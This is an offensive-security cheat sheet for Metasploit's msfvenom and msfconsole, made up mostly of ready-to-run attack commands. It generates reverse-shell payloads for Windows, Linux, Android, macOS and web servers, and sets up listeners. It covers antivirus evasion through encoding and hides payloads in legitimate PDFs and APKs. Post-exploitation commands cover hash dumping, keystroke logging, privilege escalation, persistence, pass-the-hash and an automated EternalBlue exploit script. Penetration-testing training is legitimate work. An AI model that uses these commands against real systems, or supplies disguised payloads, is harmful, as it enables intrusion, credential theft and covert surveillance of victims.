## MSFVenom 

`MSFVenom` is a command-line tool within the **Metasploit Framework** used to generate and encode payloads for exploits. It combines the functionalities of the older `msfpayload` and `msfencode` tools, allowing users to create customized payloads for various platforms (Windows, Linux, Android, etc.) and formats (executables, scripts, etc.).  

#### **Key Features**:  
1. **Payload Generation**:  
   - Create standalone malicious files (e.g., `.exe`, `.elf`, `.apk`) or shellcode snippets.  
   - Supports **staged** (small initial payload) and **stageless** (self-contained) payloads.  

2. **Encoding & Obfuscation**:  
   - Evade antivirus detection using encoders like `shikata_ga_nai`.  
   - Specify iteration counts (`-i`) for repeated encoding.  

3. **Format Flexibility**:  
   - Output to executable files (`-f exe`), scripts (`-f python`), or raw shellcode (`-f raw`).  

4. **Integration with Metasploit**:  
   - Generated payloads can be paired with `exploit/multi/handler` in `msfconsole` for reverse connections.  

---

### **Basic Syntax**:  
```bash
msfvenom -p <payload> LHOST=<attacker_IP> LPORT=<port> -f <format> -o <output_file>
```
**Example**:  
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe
```

---

### **Common Use Cases**:  
1. **Reverse Shells**: Bind a target’s shell to an attacker-controlled listener.  
2. **Fileless Attacks**: Generate shellcode for memory injection (e.g., in buffer overflow exploits).  
3. **Persistence**: Create backdoors for long-term access (e.g., via scheduled tasks).  

---

### **Important Notes**:  
- Always test payloads ethically in controlled environments.  
- Encoding ≠ encryption—modern AV may still detect obfuscated payloads. Combine with other evasion techniques (e.g., sandbox detection bypass).


### **MSFConsole**
**Metasploit Framework (MSF)** is a powerful penetration testing tool, and `msfconsole` is its primary command-line interface. Below is a brief explanation and a cheat sheet of essential commands.

---

### **Brief Explanation**  
`msfconsole` provides an interactive environment to:  
- Load & manage exploits, payloads, and auxiliary modules.  
- Configure targets, set options, and execute attacks.  
- Manage sessions (e.g., Meterpreter shells).  

---

### **Cheat Sheet Table**  

| **Category**          | **Command**                                                          | **Description**                                                                                                                 |
| --------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **General**           | `help`                                                               | Show all available commands.                                                                                                    |
|                       | `banner`                                                             | Display a random Metasploit banner.                                                                                             |
|                       | `version`                                                            | Show Metasploit version.                                                                                                        |
|                       | `exit` / `quit`                                                      | Exit `msfconsole`.                                                                                                              |
| **Modules**           | `search [keyword]`                                                   | Search for modules (exploits, payloads, etc.).                                                                                  |
|                       | `use [module_path]`                                                  | Load a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`).                                                           |
|                       | `show options`                                                       | Display configurable options for the current module.                                                                            |
|                       | `show payloads`                                                      | List compatible payloads for the current exploit.                                                                               |
| **Exploitation**      | `set RHOSTS [IP]`                                                    | Set target IP(s).                                                                                                               |
|                       | `set LHOST [IP]`                                                     | Set local listener IP (for reverse shells).                                                                                     |
|                       | `set LPORT [port]`                                                   | Set local listener port.                                                                                                        |
|                       | `run` / `exploit`                                                    | Execute the loaded module.                                                                                                      |
| **Sessions**          | `sessions -l`                                                        | List active sessions.                                                                                                           |
|                       | `sessions -i [ID]`                                                   | Interact with a session (e.g., Meterpreter).                                                                                    |
|                       | `sessions -u [ID]`                                                   | Upgrade a shell to Meterpreter.                                                                                                 |
|                       | `background`                                                         | Send an active session to the background.                                                                                       |
|                       | `sessions -C "[cmd]"`                                                | Run a command on all sessions (e.g., `sessions -C "whoami"`).                                                                   |
| **Post-Exploitation** | `meterpreter> help`                                                  | Show Meterpreter-specific commands.                                                                                             |
|                       | `meterpreter> sysinfo`                                               | View target system info.                                                                                                        |
|                       | `meterpreter> shell`                                                 | Drop into a system shell (e.g., `/bin/bash`).                                                                                   |
|                       | `meterpreter> upload [file] [path]`                                  | Upload a file to the target.                                                                                                    |
|                       | `meterpreter> download [file]`                                       | Download a file from the target.                                                                                                |
| Payload Generation    | `msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format] > [file]` | Generate a payload (e.g., `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe`)． |
| Listener Setup        | `use exploit/multi/handler`                                          | Set up a listener for incoming connections．                                                                                     |
|                       | `set PAYLOAD [payload_path]`                                         | Match payload to generated file (e.g., `windows/x64/meterpreter/reverse_tcp`)．                                                  |


---

### **Key Notes:**  
1. **Payload Generation**:  
   ```bash
   # Example: Obfuscated Windows payload
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -e x86/shikata_ga_nai -i 3 -f exe > payload.exe
   ```
 

---

### **Cheat Sheet Table (Advanced)**  

| **Category**                        | **Command**                                          | **Description**                                      |
| ----------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |
| **Evasion**                         | `msfvenom --list encoders`                           | List available encoders to evade AV.                 |
|                                     | `msfvenom -p [payload] -e [encoder] -i [iterations]` | Encode payload (e.g., `-e x86/shikata_ga_nai -i 5`). |
|                                     | `set EnableStageEncoding true`                       | Enable payload staging encoding (in `msfconsole`).   |
| **Post-Exploitation (Meterpreter)** | `meterpreter> getuid`                                | Check current user privileges.                       |
|                                     | `meterpreter> getsystem`                             | Attempt privilege escalation.                        |
|                                     | `meterpreter> migrate [PID]`                         | Move to another process (e.g., `explorer.exe`).      |
|                                     | `meterpreter> hashdump`                              | Dump password hashes (requires admin).               |
|                                     | `meterpreter> keyscan_start/stop/dump`               | Log keystrokes from the target.                      |
|                                     | `set PORTS [range]`                                  | Define ports to scan (e.g., `1-1000`)．               |
|                                     | `run`                                                | Execute the scanner                                  |
| **Resource Scripts**                | `makerc [file.txt]`                                  | Save executed commands to a script for reuse.        |
|                                     | `resource [file.txt]`                                | Run commands from a saved script.                    |

---

### **Key Notes:**  
1. **Evasion Techniques**:  
   - Use encoders (`shikata_ga_nai`) and obfuscation to bypass AV.  
   Example:  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > payload_encoded.exe
   ```  
   - **Staged Payloads**: Use `meterpreter/reverse_tcp` (staged) for smaller initial payloads, but riskier under AV scrutiny.  

2. **Listener Setup**:  
   After generating a payload, start a handler in `msfconsole`:  
   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.2
   set LPORT 4444
   run
   ```  

3. **Post-Exploitation Tips**:  
   - **Persistence**: Use `persistence` scripts in Meterpreter (e.g., `run persistence -X -i 60 -p 443 -r <LHOST>`).  
   - **Lateral Movement**: Pass-the-hash with `psexec` module or `meterpreter> pth`.  

4. **Logging & Automation**:  
   - Log all console output: `spool /path/to/log.txt`.  
   - Automate tasks with resource scripts:  
     ```bash
     echo "use exploit/windows/smb/ms17_010_eternalblue" > auto.rc
     echo "set RHOSTS 10.0.0.5" >> auto.rc
     echo "exploit" >> auto.rc
     msfconsole -r auto.rc
     ```  


---

### **Quick Reference for Common Tasks**  

| **Task**               | **Command Sequence**                                                                 |
|------------------------|-------------------------------------------------------------------------------------|
| **Generate Linux Payload** | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf` |
| **Generate Windows Payload** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe` |
| **Generate Android Payload** | `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=5555 R > malware.apk` |
| **Generate Web Payload (PHP)** | `msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 -f raw > shell.php` |
| **Start Listener (Multi-Handler)** | `use exploit/multi/handler`<br>`set PAYLOAD <payload_name>`<br>`set LHOST <IP>`<br>`set LPORT <port>`<br>`run` |
| **Privilege Escalation (Windows)** | `meterpreter> getsystem`<br>`meterpreter> migrate <PID_of_privileged_process>` |
| **Dump Hashes (Windows)** | `meterpreter> hashdump`<br>*or*<br>`meterpreter> run post/windows/gather/smart_hashdump` |
| **Persistence (Meterpreter)** | `meterpreter> run persistence -X -i 60 -p 4444 -r <LHOST>` (*-X = startup, -i = interval*) |

---

### **Additional Tips:**  
1. **Encoding Payloads**: Append to `msfvenom`:  
   ```bash
   msfvenom ... -e x86/shikata_ga_nai -i 3 # Encode 3 times
   ```
2. **Stealthier Listeners**: Use common ports (e.g., 443, 80) and prepend `/etc/hosts` spoofing:  
   ```Shell
	echo "<LHOST> google.com" >> /etc/hosts
```
   
3. **Stealthy Payload Delivery**:  
   - Append payloads to legitimate files (e.g., PDFs):  
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -x legit_file.pdf -f exe > malicious.pdf.exe
     ```  
   - Use `Template` option in `msfvenom` for better evasion.  

4. **Automation with Resource Scripts**:  
   - Example script (`auto.rc`) for auto-exploitation:  
     ```bash
     # Launch EternalBlue exploit automatically
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS 10.0.0.5
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST 192.168.1.2
     exploit
     ```  
   Run with: `msfconsole -r auto.rc`.  

5. **Troubleshooting**:  
   - **"Handler failed to bind"**: Check if port is in use (`netstat -tulnp`).  
   - **Session dies immediately**: Ensure payload architecture matches target (e.g., `x64` vs `x86`).  

---

### **Evasion Cheat Sheet**  

| **Technique**          | **Command Example**                                  | **Purpose**                          |
|------------------------|-----------------------------------------------------|--------------------------------------|
| Encoders               | `msfvenom ... -e x86/shikata_ga_nai -i 5`           | Obfuscate payload signature          |
| Staged Payloads        | `windows/meterpreter/reverse_tcp` (staged)          | Smaller initial footprint            |
| Template Injection     | `msfvenom ... -x /tmp/legit.exe -k`                 | Hide payload in benign file           |
| HTTPS Listener         | `set EnableStageEncoding true; set StagerVerifySSLCert true` | Evade network inspection |

---

### **Final Notes**:  
- Always test payloads in a controlled environment before real-world use.  
- Update Metasploit regularly (`msfupdate`) for the latest exploits/modules


# **MSFVenom Mega Cheat Sheet**  

`MSFVenom` is the ultimate payload generation tool within the **Metasploit Framework**, allowing penetration testers and ethical hackers to craft custom exploits for various platforms. Below is a **comprehensive cheat sheet** covering payloads, encoders, formats, evasion techniques, and real-world examples.  


---

## **1. Basic Syntax & Common Flags**  
```bash
msfvenom -p <payload> LHOST=<attacker_IP> LPORT=<port> [options] -f <format> -o <output_file>
```

| **Flag**       | **Description**                                                                 |
|----------------|-------------------------------------------------------------------------------|
| `-p`           | Specify payload (e.g., `windows/meterpreter/reverse_tcp`).                    |
| `LHOST`        | Attacker’s IP (for reverse shells).                                           |
| `LPORT`        | Listening port.                                                               |
| `-f`           | Output format (`exe`, `elf`, `raw`, `python`, etc.).                          |
| `-o`           | Output file (e.g., `payload.exe`).                                            |
| `-e`           | Encoder (e.g., `x86/shikata_ga_nai`).                                         |
| `-i`           | Iterations for encoding (default: 1).                                         |
| `-a`           | Architecture (`x86`, `x64`, etc.).                                            |
| `--platform`   | Target OS (`windows`, `linux`, etc.).                                         |

---

### **Notes**:  
- **Encoder Example**:  
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -e x86/shikata_ga_nai -i 3 -f exe > payload.exe
  ```
- Use `msfvenom --list formats` to see all supported output formats.  


---

## **2. Payload Types**
### **(A) Staged vs. Stageless**
| **Type**       | **Example Payload**                     | **Description** |
|---------------|----------------------------------------|----------------|
| **Staged**    | `windows/meterpreter/reverse_tcp`      | Smaller initial payload; requires handler (`exploit/multi/handler`) |
| **Stageless** | `windows/meterpreter_reverse_tcp`      | Self-contained; no need for secondary connection |

### **(B) Common Payloads by Platform**


#### **Windows**  
```bash
# Reverse TCP Shell (Stageless)  
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell_stageless.exe  

# PowerShell Payload (Base64-encoded)  
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.2 LPORT=443 -f psh -o shell.ps1  

# DLL Injection  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f dll > payload.dll  

# Service Persistence  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe-service > service.exe  
```

#### **Linux**  
```bash
# Reverse TCP Shell (x86)  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf  

# Bind Shell (x64)  
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf > bind_shell.elf  

# Python Reverse Shell  
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py  
```

#### **Android**  

```bash
# Obfuscated APK (Encoded)  
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -e x86/shikata_ga_nai -i 3 R > obfuscated.apk  

# APK Embedded in Legitimate App (Template)  
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -x legit_app.apk R > malicious.apk  

# Android Shell Payload (No Meterpreter)  
msfvenom -p android/shell/reverse_tcp LHOST=192.168.1.2 LPORT=4444 R > android_shell.apk  
```

#### **macOS**  
```bash
# Reverse TCP Shell (x64)  
msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f macho > shell.macho  

# Meterpreter Payload (Staged)  
msfvenom -p osx/x64/meterpreter_reverse_https LHOST=192.168.1.2 LPORT=443 -f macho > meterpreter.macho  
```

#### **Web Payloads**  
```bash
# PHP Reverse Shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php  

# ASPX Payload (Windows Web Shell)  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f aspx > shell.aspx  

# JSP Payload (Java Web Shell)  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.jsp  

```
